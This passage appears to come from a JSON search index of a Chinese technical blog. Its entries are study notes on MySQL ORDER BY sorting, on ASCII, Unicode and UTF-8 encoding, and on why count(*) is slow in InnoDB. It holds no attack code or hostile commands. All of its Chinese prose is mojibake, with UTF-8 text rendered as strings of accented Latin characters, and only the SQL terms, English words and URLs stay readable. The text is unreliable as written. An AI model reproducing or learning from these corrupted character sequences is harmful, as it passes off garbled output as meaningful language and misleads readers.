æˆç£ç›˜è¯»ï¼Œå› æ­¤ä¸ä¼šè¢«ä¼˜å…ˆé€‰æ‹©ã€‚ å…¶å®å¹¶ä¸æ˜¯æ‰€æœ‰çš„ order by è¯­å¥ï¼Œéƒ½éœ€è¦æ’åºæ“ä½œçš„ã€‚ ä»ä¸Šé¢åˆ†æçš„æ‰§è¡Œè¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒMySQL ä¹‹æ‰€ä»¥éœ€è¦ç”Ÿæˆä¸´æ—¶è¡¨ï¼Œå¹¶ä¸”åœ¨ä¸´æ—¶è¡¨ä¸Šåšæ’åºæ“ä½œï¼Œå…¶åŸå› æ˜¯åŸæ¥çš„æ•°æ®éƒ½æ˜¯æ— åºçš„ã€‚ ä¹Ÿå°±æ˜¯è¯´å¦‚æœèƒ½å¤Ÿä¿è¯ä»ç´¢å¼•ä¸Šå–å‡ºæ¥çš„è¡Œï¼Œå¤©ç„¶å°±æ˜¯æŒ‰æŸä¸ªé¡ºåºï¼ˆé€’å¢æˆ–è€…é€’å‡ï¼‰æ’åˆ—çš„è¯ï¼Œé‚£å°±å¯ä»¥ä¸ç”¨å†æ’åºäº†ã€‚ æ€»ç»“ Mysql çš„è®¾è®¡æ€æƒ³ï¼šå¦‚æœå†…å­˜å¤Ÿï¼Œå°±è¦å¤šåˆ©ç”¨å†…å­˜ï¼Œå°½é‡å‡å°‘ç£ç›˜è®¿é—® åœ¨ Mysql ä¸­åšæ’åºï¼Œæ˜¯ä¸€ä¸ªæˆæœ¬æ¯”è¾ƒé«˜çš„æ“ä½œï¼Œä½†ä¹Ÿä¸æ˜¯æ‰€æœ‰ order by éƒ½éœ€è¦æ’åºï¼Œåªæœ‰æ•°æ®æ˜¯æ— åºçš„æ—¶å€™ï¼Œæ‰ä¼šç”Ÿæˆä¸´æ—¶è¡¨ï¼Œå¹¶åœ¨ä¸´æ—¶è¡¨ä¸Šé¢è¿›è¡Œæ’åº InnoDB æœ‰ä¸¤ç§æ’åºæ–¹å¼ï¼šå…¨å­—æ®µæ’åºå’Œrowid æ’åºï¼Œrowid æ’åºä¼šè¦æ±‚å›è¡¨å¤šé€ æˆç£ç›˜è¯»ï¼Œé€šå¸¸ä¸ä¼šè¢«ä¼˜å…ˆé€‰æ‹©","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"å­—ç¬¦ç¼–ç ç¬”è®°ï¼šASCIIï¼ŒUnicode å’Œ UTF-8","slug":"ascii-unicode-and-utf-8","date":"2022-07-02T13:38:33.000Z","updated":"2023-02-18T03:28:33.573Z","comments":true,"path":"ascii-unicode-and-utf-8/","link":"","permalink":"https://www.0x2beace.com/ascii-unicode-and-utf-8/","excerpt":"ä¸å¾—ä¸çŸ¥é“çš„å­—ç¬¦ç¼–ç çš„çŸ¥è¯†ã€‚","text":"ä¸å¾—ä¸çŸ¥é“çš„å­—ç¬¦ç¼–ç çš„çŸ¥è¯†ã€‚ ASCII ç æ‰€è°“ASCII ç ï¼Œå°±æ˜¯ä¸€å¥—å­—ç¬¦ç¼–ç ï¼Œå®ƒè§„å®šäº†è‹±æ–‡ä¸­çš„å„ç§å­—ç¬¦åœ¨è®¡ç®—æœºé‡Œè¡¨ç¤ºå½¢å¼ã€‚ ASCII ç ä¸€å…±è§„å®šäº†128ä¸ªå­—ç¬¦çš„ç¼–ç ï¼Œä¾‹å¦‚å­—æ¯ a çš„äºŒè¿›åˆ¶ç¼–ç æ˜¯0110 0001ï¼ŒæŠŠè¿™ä¸ªäºŒè¿›åˆ¶è½¬æˆåè¿›åˆ¶å°±æ˜¯97ã€‚ æ‰€ä»¥å­—æ¯ a åœ¨ASCII ç è¡¨ä¸­å¯¹åº”çš„ ASCIIå€¼å°±æ˜¯ 97ã€‚ å¦‚æœä»”ç»†æ€è€ƒä¸€ä¸‹ï¼Œå°±ä¼šå‘ç°ä¸€ä¸ªä¸¥é‡çš„é—®é¢˜ï¼ŒASCII ç ä»…ä»…åªæ˜¯å¯¹è‹±æ–‡å­—ç¬¦è¿›è¡Œç¼–ç ã€‚ å¯é—®é¢˜æ˜¯ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰å›½å®¶çš„è¯­è¨€éƒ½æ˜¯ä½¿ç”¨è‹±æ–‡ï¼Œäºæ˜¯ï¼Œå„ä¸ªå›½å®¶ä¾¿æœ‰äº†è‡ªå·±çš„å­—ç¬¦é›†ã€‚ ä»€ä¹ˆæ˜¯å­—ç¬¦é›†ï¼Ÿ å­—ç¬¦é›†å°±æ˜¯ä¸€ä¸ªç³»ç»Ÿæ”¯æŒçš„æ‰€æœ‰æŠ½è±¡å­—ç¬¦çš„é›†åˆï¼Œå­—ç¬¦é›†è¯´åˆ°åº•ï¼Œå®ƒçº¦å®šäº†ä¸åŒå­—ç¬¦åœ¨äºŒè¿›åˆ¶ä¸Šçš„è¡¨ç°å½¢å¼ã€‚ å¸¸è§çš„å­—ç¬¦é›†ï¼š ASCIIï¼ˆç¾å›½ï¼‰ï¼šæœ€åŸºæœ¬çš„å­—ç¬¦é›†ï¼Œæ¶µç›–äº†æ‰€æœ‰çš„è‹±æ–‡å­—æ¯å’Œä¸€äº›å¸¸ç”¨çš„å­—ç¬¦ GB2312ï¼ˆä¸­å›½ï¼‰ï¼šä¸­å›½çš„å­—ç¬¦é›†ï¼ŒåŠ å…¥äº†å¤§æ¦‚6000 ä¸ªæ±‰å­— GBKï¼ˆä¸­å›½ï¼‰ï¼šGB2312 çš„æ‰©å±• â€¦ å¯æ˜¯æ–°çš„é—®é¢˜åˆæ¥äº†ï¼Œå¦‚æœæ”¾ä»»å„ä¸ªå›½å®¶ä½¿ç”¨è‡ªå·±çš„å­—ç¬¦é›†å°±ä¹±å¥—äº†ã€‚ æ­¤æ—¶ï¼Œå¦‚æœèƒ½å‡ºç°ä¸€ä¸ªç»Ÿä¸€æ‰€æœ‰å­—ç¬¦çš„å­—ç¬¦é›†å°±å¥½äº†ï¼Œå®ƒæ”¶å½•äº†ä¸–ç•Œå„å›½çš„æ–‡å­—ï¼Œä»»ä½•ä¸€ä¸ªå­—ç¬¦éƒ½å¯ä»¥åœ¨å…¶ä¸­æ‰¾åˆ°å¯¹åº” çš„ç¼–ç ã€‚ Unicodeäºæ˜¯ Unicode ä¾¿è¯ç”Ÿäº†ã€‚ å®ƒçš„å‡ºç°è§£å†³äº†å­—ç¬¦é›†å¤§ç»Ÿä¸€çš„é—®é¢˜ï¼Œæ¶µç›–äº†å„ä¸ªå›½å®¶çš„å­—ç¬¦é›†ï¼Œè¿™å°±æ˜¯ Unicode å­—ç¬¦é›†ã€‚ é‚£ä¹ˆæ–°çš„é—®é¢˜ä¹Ÿéšä¹‹è€Œæ¥äº†ã€‚Unicode åªæ˜¯ä¸€ä¸ªå­—ç¬¦é›†ï¼Œå®ƒè§„å®šäº†ä¸åŒçš„å­—ç¬¦åœ¨äºŒè¿›åˆ¶ä¸Šçš„è¡¨ç¤ºå½¢å¼ã€‚ æ¯”å¦‚ â€œä¸­â€ è¿™ä¸ªæ±‰å­—ï¼Œå®ƒçš„ Unicode ç¼–ç æ˜¯ \\u4e2dï¼Œ4e2d æ˜¯ åå…­è¿›åˆ¶ï¼Œè½¬æ¢æˆåè¿›åˆ¶æ˜¯ 20013ï¼Œè½¬æ¢æˆäºŒè¿›åˆ¶æ˜¯ 01001110 00101101ï¼Œè¿™ä¸€ä¸ªæ±‰å­—ï¼Œè‡³å°‘éœ€è¦ä¸¤ä¸ªå­—èŠ‚æ¥å­˜å‚¨ã€‚ é—®é¢˜å°±åœ¨äºï¼ŒUnicode åªæ˜¯è§„å®šäº†è¿™äº›å­—ç¬¦å¯¹åº”çš„äºŒè¿›åˆ¶å€¼ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è§„å®šè¿™äº›äºŒè¿›åˆ¶å€¼è¯¥å¦‚ä½•å­˜å‚¨ã€‚ è¿™ä¸ªæ±‰å­—ä¸¤ä¸ªå­—èŠ‚å°±èƒ½å­˜å‚¨ï¼Œä½†æœ‰äº›å­—ç¬¦éœ€è¦ä¸‰ä¸ªå­—èŠ‚ï¼Œç”šè‡³å››ä¸ªã€‚åƒ a è¿™ç§å­—ç¬¦ï¼Œä»¥å‰ç”¨ ASCII ç çš„æ—¶å€™ï¼Œç”¨ä¸€ä¸ªå­—èŠ‚å°±èƒ½è¡¨ç¤ºï¼Œä½†æ˜¯åœ¨ Unicode é‡Œå¦‚æœé‡‡ç”¨ä¸¤ä¸ªå­—èŠ‚æˆ–ä¸‰ä¸ªçš„å›ºå®šé•¿åº¦ç¼–ç ï¼Œä¸ä»…ç©ºé—´åˆ©ç”¨ç‡å¾ˆå·®ï¼ŒåŒæ—¶ä¸é‡‡ç”¨ä¸€ä¸ªå­—èŠ‚ç¼–ç çš„ ASCII å­—ç¬¦é›†ä¹Ÿæ— æ³•å…¼å®¹ã€‚ UTF-8é’ˆå¯¹è¿™äº›é—®é¢˜ï¼ŒUTF-8 ç¼–ç æ–¹æ¡ˆä¾¿è¯ç”Ÿäº†ã€‚ å®ƒæ˜¯ Unicode çš„ä¸€ç§å®ç°ï¼Œå®ƒåªå–äº† Unicode ä¸­æœ€å¸¸ç”¨çš„ä¸€éƒ¨åˆ†ï¼Œé€šè¿‡å¯å˜é•¿åº¦ç¼–ç æ–¹å¼æ¥å­˜å‚¨ã€‚è¿™æ ·ä¸€æ¥ï¼Œæ—¢è§£å†³äº†Unicode çš„ç¼–ç é—®é¢˜ï¼Œä¹Ÿå°½å¯èƒ½åœ°èŠ‚çº¦äº†ç©ºé—´ã€‚ å¯¹äºASCII ç è¡¨é‡Œçš„å­—ç¬¦ä»ç„¶ç”¨ä¸€ä¸ªå­—èŠ‚æ¥å­˜å‚¨ï¼Œè€Œä¸€ä¸ªæ±‰å­—ç”¨ä¸‰ä¸ªå­—èŠ‚æ¥å­˜å‚¨ã€‚ ä¸‰è€…çš„å…³ç³»ASCIIï¼šä¸€ä¸ªå­—ç¬¦é›†ï¼ˆä¸€å¥—å­—ç¬¦ç¼–ç ï¼‰ï¼Œè§„å®šäº† 128 ä¸ªå­—ç¬¦çš„ç¼–ç  Unicodeï¼šåŒæ ·æ˜¯ä¸€ä¸ªå­—ç¬¦é›†ï¼ˆä¸€å¥—å­—ç¬¦ç¼–ç ï¼‰ï¼Œåªä¸è¿‡å®ƒæ›´å¤§æ›´å®Œæ•´ï¼Œæ”¶å½•äº†ä¸–ç•Œå„å›½çš„æ–‡å­—ï¼Œä»»ä½•ä¸€ä¸ªå­—ç¬¦éƒ½å¯ä»¥åœ¨å…¶ä¸­æ‰¾åˆ°å¯¹åº” Unicode ç¼–ç  UTF-8ï¼šä¸€ç§ç¼–ç æ–¹æ¡ˆï¼ˆæ˜¯ Unicode çš„å®ç°ï¼‰ï¼Œé€šè¿‡å¯å˜é•¿çš„ç¼–ç æ–¹å¼ï¼Œè§£å†³ä¸åŒå­—èŠ‚å¤§å°çš„å­˜å‚¨é—®é¢˜ ä¹±ç æ˜¯å¦‚ä½•äº§ç”Ÿçš„åœ¨å›ç­”è¿™ä¸ªé—®é¢˜ä¹‹å‰ï¼Œé¦–å…ˆæ¥çœ‹çœ‹ä»€ä¹ˆæ˜¯ç¼–ç å’Œè§£ç ã€‚ ç¼–ç ï¼šå°†æ­£å¸¸çš„å­—ç¬¦é€‰æ‹©ä»»æ„ç±»å‹çš„ç¼–ç æ–¹å¼ï¼Œè½¬æ¢ä¸ºå¯¹åº”çš„äºŒè¿›åˆ¶å€¼ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯ç¼–ç ã€‚æ— è®ºä½¿ç”¨å“ªä¸€ç§ç¼–ç æ–¹å¼è¿›è¡Œç¼–ç ï¼Œæœ€ç»ˆéƒ½æ˜¯å˜æˆè®¡ç®—æœºçš„äºŒè¿›åˆ¶å€¼ã€‚ è§£ç ï¼šä¸€ä¸²äºŒè¿›åˆ¶å€¼ï¼Œä½¿ç”¨ä¸€ç§ç¼–ç æ–¹å¼ï¼Œè½¬æ¢æˆçš„å¯¹åº”çš„å­—ç¬¦ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºè§£ç ã€‚ è§£ç æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä»»æ„çš„ç¼–ç æ–¹å¼è¿›è¡Œè§£ç ï¼Œä½†æ˜¯å¾€å¾€åªæœ‰ä¸€ç§ç¼–ç æ–¹å¼å¯ä»¥æ˜¾ç¤ºæ­£å¸¸ï¼Œå…¶ä»–ç¼–ç æ–¹å¼è§£å‡ºæ¥çš„å­—ç¬¦åˆ™éƒ½ä¼šæ˜¯ä¹±ç ã€‚ ä½†æ˜¯è¿™ç§æœ‰ä¸€ä¸ªé—®é¢˜éœ€è¦æ³¨æ„ï¼šç¼–ç è§„èŒƒçš„å­—åº“è¡¨é‡Œé¢ä¸åŒ…å«ç›®æ ‡å­—ç¬¦ï¼Œé‚£å°±æ— æ³•åœ¨å­—ç¬¦é›†ä¸­æ‰¾åˆ°å¯¹åº”çš„äºŒè¿›åˆ¶å€¼ï¼Œè¿™å°±ä¼šå¯¼è‡´ä¸å¯é€†çš„ä¹±ç ã€‚ ä¸¾ä¸ªä¾‹å­å°±æ˜¯ï¼šISO-8859-1 ä¸åŒ…å«ä¸­æ–‡å­—ç¬¦ï¼Œå¦‚æœé€‰æ‹©è¿™ç§ç¼–ç æ–¹å¼å¯¹ä¸­æ–‡å­—ç¬¦è¿›è¡Œç¼–ç ï¼Œé‚£ä¹ˆå°±ç®—æœ€ç»ˆä½¿ç”¨åŒæ ·çš„ç¼–ç æ–¹å¼è¿›è¡Œè§£ç ï¼Œçœ‹åˆ°çš„å§‹ç»ˆéƒ½æ˜¯ä¹±ç ã€‚ ä¹±ç è¯´ç™½äº†å°±æ˜¯ç¼–ç å’Œè§£ç ä½¿ç”¨çš„ç¼–ç æ–¹å¼ä¸ä¸€è‡´å¯¼è‡´çš„é—®é¢˜ï¼ˆå½“ç„¶ï¼Œè¿˜æœ‰å­—åº“è¡¨ä¸åŒ…å«ç›®æ ‡å­—ç¬¦æ—¶ä¹Ÿä¼šå‡ºç°ï¼‰ã€‚","categories":[{"name":"è®¡ç®—æœºåŸºç¡€","slug":"è®¡ç®—æœºåŸºç¡€","permalink":"https://www.0x2beace.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"è®¡ç®—æœºåŸºç¡€","slug":"è®¡ç®—æœºåŸºç¡€","permalink":"https://www.0x2beace.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}]},{"title":"14 count(*)è¿™ä¹ˆæ…¢ï¼Œæˆ‘è¯¥æ€ä¹ˆåŠ","slug":"count-is-so-slow-what-should-i-do","date":"2022-06-26T15:14:51.000Z","updated":"2023-02-18T03:28:33.576Z","comments":true,"path":"count-is-so-slow-what-should-i-do/","link":"","permalink":"https://www.0x2beace.com/count-is-so-slow-what-should-i-do/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ count(*) çš„å®ç°æ–¹å¼ äº†è§£å¸¸ç”¨çš„ç»Ÿè®¡è®¡æ•°çš„æ–¹æ¡ˆä»¥åŠå„è‡ªçš„ä¼˜åŠ£åŠ¿ çŸ¥é“ count(*)ã€count(id)ã€count(1) è¿™å‡ è€…çš„å·®åˆ«","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ count(*) çš„å®ç°æ–¹å¼ äº†è§£å¸¸ç”¨çš„ç»Ÿè®¡è®¡æ•°çš„æ–¹æ¡ˆä»¥åŠå„è‡ªçš„ä¼˜åŠ£åŠ¿ çŸ¥é“ count(*)ã€count(id)ã€count(1) è¿™å‡ è€…çš„å·®åˆ« count(*) çš„å®ç°æ–¹å¼é¦–å…ˆè¦æ˜ç¡®çš„æ˜¯ï¼Œåœ¨ä¸åŒçš„ MySQL å¼•æ“ä¸­ï¼Œcount(*) æœ‰ä¸åŒçš„å®ç°æ–¹å¼ã€‚ MyISAM å¼•æ“æŠŠä¸€ä¸ªè¡¨çš„æ€»è¡Œæ•°å­˜åœ¨äº†ç£ç›˜ä¸Šï¼Œå› æ­¤æ‰§è¡Œ count(*) çš„æ—¶å€™ä¼šç›´æ¥è¿”å›è¿™ä¸ªæ•°ï¼Œæ•ˆç‡å¾ˆé«˜ è€Œ InnoDB å¼•æ“å°±éº»çƒ¦äº†ï¼Œå®ƒæ‰§è¡Œ count(*) çš„æ—¶å€™ï¼Œéœ€è¦æŠŠæ•°æ®ä¸€è¡Œä¸€è¡Œåœ°ä»å¼•æ“é‡Œé¢è¯»å‡ºæ¥ï¼Œç„¶åç´¯ç§¯è®¡æ•° é‚£ä¸ºä»€ä¹ˆ InnoDB ä¸è·Ÿ MyISAM ä¸€æ ·ï¼Œä¹ŸæŠŠæ•°å­—å­˜èµ·æ¥å‘¢ï¼Ÿ è¿™æ˜¯å› ä¸ºå³ä½¿æ˜¯åœ¨åŒä¸€ä¸ªæ—¶åˆ»çš„å¤šä¸ªæŸ¥è¯¢ï¼Œç”±äºå¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼ˆMVCCï¼‰çš„åŸå› ï¼ŒInnoDB è¡¨â€œåº”è¯¥è¿”å›å¤šå°‘è¡Œâ€ä¹Ÿæ˜¯ä¸ç¡®å®šçš„ã€‚ InnoDB æ˜¯ç´¢å¼•ç»„ç»‡è¡¨ï¼Œä¸»é”®ç´¢å¼•æ ‘çš„å¶å­èŠ‚ç‚¹æ˜¯æ•°æ®ï¼Œè€Œæ™®é€šç´¢å¼•æ ‘çš„å¶å­èŠ‚ç‚¹æ˜¯ä¸»é”®å€¼ã€‚ æ‰€ä»¥ï¼Œæ™®é€šç´¢å¼•æ ‘æ¯”ä¸»é”®ç´¢å¼•æ ‘å°å¾ˆå¤šã€‚å¯¹äº count() è¿™æ ·çš„æ“ä½œï¼Œéå†å“ªä¸ªç´¢å¼•æ ‘å¾—åˆ°çš„ç»“æœé€»è¾‘ä¸Šéƒ½æ˜¯ä¸€æ ·çš„ã€‚å› æ­¤ï¼ŒMySQL ä¼˜åŒ–å™¨ä¼šæ‰¾åˆ°æœ€å°çš„é‚£æ£µæ ‘æ¥éå†ã€‚*åœ¨ä¿è¯é€»è¾‘æ­£ç¡®çš„å‰æä¸‹ï¼Œå°½é‡å‡å°‘æ‰«æçš„æ•°æ®é‡ï¼Œæ˜¯æ•°æ®åº“ç³»ç»Ÿè®¾è®¡çš„é€šç”¨æ³•åˆ™ä¹‹ä¸€**ã€‚ å¦‚æœä½ ç”¨è¿‡ show table status å‘½ä»¤çš„è¯ï¼Œå°±ä¼šå‘ç°è¿™ä¸ªå‘½ä»¤çš„è¾“å‡ºç»“æœé‡Œé¢ä¹Ÿæœ‰ä¸€ä¸ª TABLE_ROWS ç”¨äºæ˜¾ç¤ºè¿™ä¸ªè¡¨å½“å‰æœ‰å¤šå°‘è¡Œï¼Œè¿™ä¸ªå‘½ä»¤æ‰§è¡ŒæŒºå¿«çš„ï¼Œé‚£è¿™ä¸ª TABLE_ROWS èƒ½ä»£æ›¿ count(*) å—ï¼Ÿ ç­”æ¡ˆæ˜¯ä¸å¯ä»¥çš„ã€‚ TABLE_ROWS å°±æ˜¯ä»è¿™ä¸ªé‡‡æ ·ä¼°ç®—å¾—æ¥çš„ï¼Œå› æ­¤å®ƒä¹Ÿå¾ˆä¸å‡†ã€‚æœ‰å¤šä¸å‡†å‘¢ï¼Œå®˜æ–¹æ–‡æ¡£è¯´è¯¯å·®å¯èƒ½è¾¾åˆ° 40% åˆ° 50%ã€‚æ‰€ä»¥ï¼Œshow table status å‘½ä»¤æ˜¾ç¤ºçš„è¡Œæ•°ä¹Ÿä¸èƒ½ç›´æ¥ä½¿ç”¨ã€‚ å°ç»“ä¸€ä¸‹ï¼š MyISAM è¡¨è™½ç„¶ count(*) å¾ˆå¿«ï¼Œä½†æ˜¯ä¸æ”¯æŒäº‹åŠ¡ï¼› show table status å‘½ä»¤è™½ç„¶è¿”å›å¾ˆå¿«ï¼Œä½†æ˜¯ä¸å‡†ç¡®ï¼› InnoDB è¡¨ç›´æ¥ count(*) ä¼šéå†å…¨è¡¨ï¼Œè™½ç„¶ç»“æœå‡†ç¡®ï¼Œä½†ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜ã€‚ å›åˆ°æ–‡ç« å¼€å¤´çš„é—®é¢˜ï¼Œå¦‚æœä½ ç°åœ¨æœ‰ä¸€ä¸ªé¡µé¢ç»å¸¸è¦æ˜¾ç¤ºäº¤æ˜“ç³»ç»Ÿçš„æ“ä½œè®°å½•æ€»æ•°ï¼Œåˆ°åº•åº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿç­”æ¡ˆæ˜¯ï¼Œæˆ‘ä»¬åªèƒ½è‡ªå·±è®¡æ•°ã€‚ è®¡æ•°æ€è·¯ï¼šæ‰¾ä¸€ä¸ªåœ°æ–¹ï¼ŒæŠŠæ“ä½œè®°å½•è¡¨çš„è¡Œæ•°å­˜èµ·æ¥ã€‚ ç”¨ç¼“å­˜ç³»ç»Ÿä¿å­˜è®¡æ•°å¯¹äºæ›´æ–°å¾ˆé¢‘ç¹çš„åº“æ¥è¯´ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„å°±æ˜¯ç¼“å­˜äº†ã€‚ å¯ä»¥ä½¿ç”¨ Redis å°†è¡¨çš„æ€»è¡Œæ•°ä¿å­˜ä¸‹æ¥ï¼Œè¿™ä¸ªè¡¨æ¯è¢«æ’å…¥ä¸€è¡Œ Redis è®¡æ•°å°±åŠ  1ï¼Œæ¯è¢«åˆ é™¤ä¸€è¡Œ Redis è®¡æ•°å°±å‡ 1ã€‚ è¿™ç§æ–¹å¼ä¸‹ï¼Œè¯»å’Œæ›´æ–°æ“ä½œéƒ½å¾ˆå¿«ï¼Œå¯æ˜¯ï¼Œè¿™æ˜¯å¦å°±æ˜¯å®Œç¾çš„è§£å†³æ–¹æ¡ˆå‘¢ï¼Ÿ ä¸æ˜¯çš„ï¼Œå› ä¸ºç¼“å­˜å¯èƒ½ä¼šä¸¢å¤±ã€‚Redis çš„æ•°æ®ä¸èƒ½æ°¸ä¹…åœ°ç•™åœ¨å†…å­˜é‡Œï¼ŒRedis å¯èƒ½ä¼šå¼‚å¸¸é‡å¯ã€‚ å¦å¤–å°±æ˜¯å°†è®¡æ•°ä¿å­˜åœ¨ç¼“å­˜ç³»ç»Ÿä¸­çš„æ–¹å¼ï¼Œè¿˜ä¸åªæ˜¯ä¸¢å¤±æ›´æ–°çš„é—®é¢˜ã€‚å³ä½¿ Redis æ­£å¸¸å·¥ä½œï¼Œè¿™ä¸ªå€¼è¿˜æ˜¯é€»è¾‘ä¸Šä¸ç²¾ç¡®çš„ã€‚ è¿™é‡Œè¯´çš„ä¸ç²¾ç¡®æ˜¯è¿™ä¹ˆå®šä¹‰çš„ï¼š ä¸€ç§æ˜¯ï¼ŒæŸ¥åˆ°çš„ 100 è¡Œç»“æœé‡Œé¢æœ‰æœ€æ–°æ’å…¥è®°å½•ï¼Œè€Œ Redis çš„è®¡æ•°é‡Œè¿˜æ²¡åŠ  1 å¦ä¸€ç§æ˜¯ï¼ŒæŸ¥åˆ°çš„ 100 è¡Œç»“æœé‡Œæ²¡æœ‰æœ€æ–°æ’å…¥çš„è®°å½•ï¼Œè€Œ Redis çš„è®¡æ•°é‡Œå·²ç»åŠ äº† 1 åœ¨æ•°æ®åº“ä¿å­˜è®¡æ•°å¦‚æœæŠŠè¿™ä¸ªè®¡æ•°ç›´æ¥æ”¾åˆ°æ•°æ®åº“é‡Œå•ç‹¬çš„ä¸€å¼ è®¡æ•°è¡¨ä¸­ï¼Œå°±å¯ä»¥å¾ˆå¥½åœ°è§£å†³ä¸Šé¢çš„ä¸¤ä¸ªé—®é¢˜ã€‚ åªæ˜¯è¿™ä¸ªæ–¹æ¡ˆç›¸æ¯”ä¸Šä¸€ä¸ªæ–¹æ¡ˆï¼Œåœ¨æŸ¥è¯¢é€Ÿåº¦ä¸Šé¢ï¼Œå‰è€…æ›´å¿«ä¸€äº›ã€‚ ä¸åŒçš„ count ç”¨æ³•ç»å¸¸ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼šåœ¨ select count(?) from t è¿™æ ·çš„æŸ¥è¯¢è¯­å¥é‡Œé¢ï¼Œcount(*)ã€count(ä¸»é”® id)ã€count(å­—æ®µ) å’Œ count(1) ç­‰ä¸åŒç”¨æ³•çš„æ€§èƒ½ï¼Œæœ‰å“ªäº›å·®åˆ«ï¼Ÿ é¦–å…ˆéœ€è¦å¼„æ¸…æ¥š count() çš„è¯­ä¹‰ã€‚count() æ˜¯ä¸€ä¸ªèšåˆå‡½æ•°ï¼Œå¯¹äºè¿”å›çš„ç»“æœé›†ï¼Œä¸€è¡Œè¡Œåœ°åˆ¤æ–­ï¼Œå¦‚æœ count å‡½æ•°çš„å‚æ•°ä¸æ˜¯ NULLï¼Œç´¯è®¡å€¼å°±åŠ  1ï¼Œå¦åˆ™ä¸åŠ ã€‚æœ€åè¿”å›ç´¯è®¡å€¼ã€‚ æ‰€ä»¥ï¼Œcount(*)ã€count(ä¸»é”® id) å’Œ count(1) éƒ½è¡¨ç¤ºè¿”å›æ»¡è¶³æ¡ä»¶çš„ç»“æœé›†çš„æ€»è¡Œæ•°ï¼›è€Œ count(å­—æ®µï¼‰ï¼Œåˆ™è¡¨ç¤ºè¿”å›æ»¡è¶³æ¡ä»¶çš„æ•°æ®è¡Œé‡Œé¢ï¼Œå‚æ•°â€œå­—æ®µâ€ä¸ä¸º NULL çš„æ€»ä¸ªæ•°ã€‚ è‡³äºåˆ†ææ€§èƒ½å·®åˆ«çš„æ—¶å€™ï¼Œä½ å¯ä»¥è®°ä½è¿™ä¹ˆå‡ ä¸ªåŸåˆ™ï¼š server å±‚è¦ä»€ä¹ˆå°±ç»™ä»€ä¹ˆ InnoDB åªç»™å¿…è¦çš„å€¼ ç°åœ¨çš„ä¼˜åŒ–å™¨åªä¼˜åŒ–äº† count(*) çš„è¯­ä¹‰ä¸ºâ€œå–è¡Œæ•°â€ï¼Œå…¶ä»–â€œæ˜¾è€Œæ˜“è§â€çš„ä¼˜åŒ–å¹¶æ²¡æœ‰åš å¯¹äº count(ä¸»é”® id) æ¥è¯´ï¼ŒInnoDB å¼•æ“ä¼šéå†æ•´å¼ è¡¨ï¼ŒæŠŠæ¯ä¸€è¡Œçš„ id å€¼éƒ½å–å‡ºæ¥ï¼Œè¿”å›ç»™ server å±‚ã€‚server å±‚æ‹¿åˆ° id åï¼Œåˆ¤æ–­æ˜¯ä¸å¯èƒ½ä¸ºç©ºçš„ï¼Œå°±æŒ‰è¡Œç´¯åŠ ã€‚ å¯¹äº count(1) æ¥è¯´ï¼ŒInnoDB å¼•æ“éå†æ•´å¼ è¡¨ï¼Œä½†ä¸å–å€¼ã€‚server å±‚å¯¹äºè¿”å›çš„æ¯ä¸€è¡Œï¼Œæ”¾ä¸€ä¸ªæ•°å­—â€œ1â€è¿›å»ï¼Œåˆ¤æ–­æ˜¯ä¸å¯èƒ½ä¸ºç©ºçš„ï¼ŒæŒ‰è¡Œç´¯åŠ ã€‚ å•çœ‹è¿™ä¸¤ä¸ªç”¨æ³•çš„å·®åˆ«çš„è¯ï¼Œä½ èƒ½å¯¹æ¯”å‡ºæ¥ï¼Œcount(1) æ‰§è¡Œå¾—è¦æ¯” count(ä¸»é”® id) å¿«ã€‚å› ä¸ºä»å¼•æ“è¿”å› id ä¼šæ¶‰åŠåˆ°è§£ææ•°æ®è¡Œï¼Œä»¥åŠæ‹·è´å­—æ®µå€¼çš„æ“ä½œã€‚ å¯¹äº count(å­—æ®µ) æ¥è¯´ï¼š å¦‚æœè¿™ä¸ªâ€œå­—æ®µâ€æ˜¯å®šä¹‰ä¸º not null çš„è¯ï¼Œä¸€è¡Œè¡Œåœ°ä»è®°å½•é‡Œé¢è¯»å‡ºè¿™ä¸ªå­—æ®µï¼Œåˆ¤æ–­ä¸èƒ½ä¸º nullï¼ŒæŒ‰è¡Œç´¯åŠ ï¼› å¦‚æœè¿™ä¸ªâ€œå­—æ®µâ€å®šä¹‰å…è®¸ä¸º nullï¼Œé‚£ä¹ˆæ‰§è¡Œçš„æ—¶å€™ï¼Œåˆ¤æ–­åˆ°æœ‰å¯èƒ½æ˜¯ nullï¼Œè¿˜è¦æŠŠå€¼å–å‡ºæ¥å†åˆ¤æ–­ä¸€ä¸‹ï¼Œä¸æ˜¯ null æ‰ç´¯åŠ ã€‚ 